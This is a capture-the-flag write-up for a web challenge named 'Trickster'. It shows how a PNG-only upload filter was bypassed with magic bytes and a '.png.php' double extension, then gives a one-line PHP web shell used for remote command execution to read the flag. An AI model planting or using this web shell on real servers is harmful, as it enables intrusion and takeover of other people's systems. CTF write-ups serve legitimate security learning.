# Trickster - Web
![image](https://github.com/JosephB10/CTF-Writeups/assets/105746932/30fc0bfe-3ebd-4de5-9c2d-032677985a76)
## Hints
- None
## Solution
You are given a website with a file uploader and a note that you can only upload PNG pictures for processing.
<br><br>Without using a directory fuzzer, or at least checking `robots.txt` this CTF is kinda obscure. (I thought fuzzing was generally out of scope.)

The Solution.
- Pick any PNG file and capture the POST with burpsuite
- Delete everything behind the `PNG` written in the data dump 
  - This leaves the PNG header magic bytes at the top of the file
  - Which is all the filter checks for
- Change the title of the .PNG file to `something.png.php` 
  - This satisfies the requirement to have .png in the name, but will execute as .php
- Add `<?php echo system($_GET['cmd']); ?>` to the body of the message where the picture information would normally be
  - This inputs php code that you can later call on for an RCE
- Then navigate to the upload page and add `.../uploads/something.png.php?cmd=   `
  - Now you can enter any command you want after cmd and the code in your picture will execute it
  - I knew we were in `/var/www/html/uploads` because of some errors that were thrown when I was exploring earlier
  - `ls /var/www/html`    -->  Came back with
    -  ` GAZWIMLEGU2DQ.txt index.phpinstructions.txtrobots.txt uploads uploads`
  - `cat /var/www/html GAZWIMLEGU2DQ.txt` gave the flag

<br><br>
## Random Notes
Once I found out I had code execution I tried to get reverse shells (a php shell, and then a python shell with the RCE) but it didn't work
- They would hang the program but not actually reach my machine
 

<br>I probably would've solved this problem within the first hour if I had fuzzed the directories
- However I thought this was out of scope and so the only way I found the solution was randomly trying to reach `/uploads` in a moment of desperation
 
<br>Also once I had RCE there was a directory called `challenge` which I didn't have access to as user `www-data`
- So I spent some time trying to find a way to elevate my privileges and/or throw a rev shell so I could get access to that directory
- Turns out the weirdly named file in `/var/www/html` was the flag
 
<br>Learned about `polyglot` files and spent a lot of time researching png/phar combo's
- That way I could upload a valid png file with a php executable code tacked on to the end of it
- and there were multiple processing calls that could've been in the source code and would've executed the phar stub
- Which made sense with the way the CTF was worded
 
<br>Also learned about `multipart form-data` vulnerabilities 
- Trying to get these two solutions to work cost me a LOT of time



<br>
A useful resource for upload form attacks
https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/
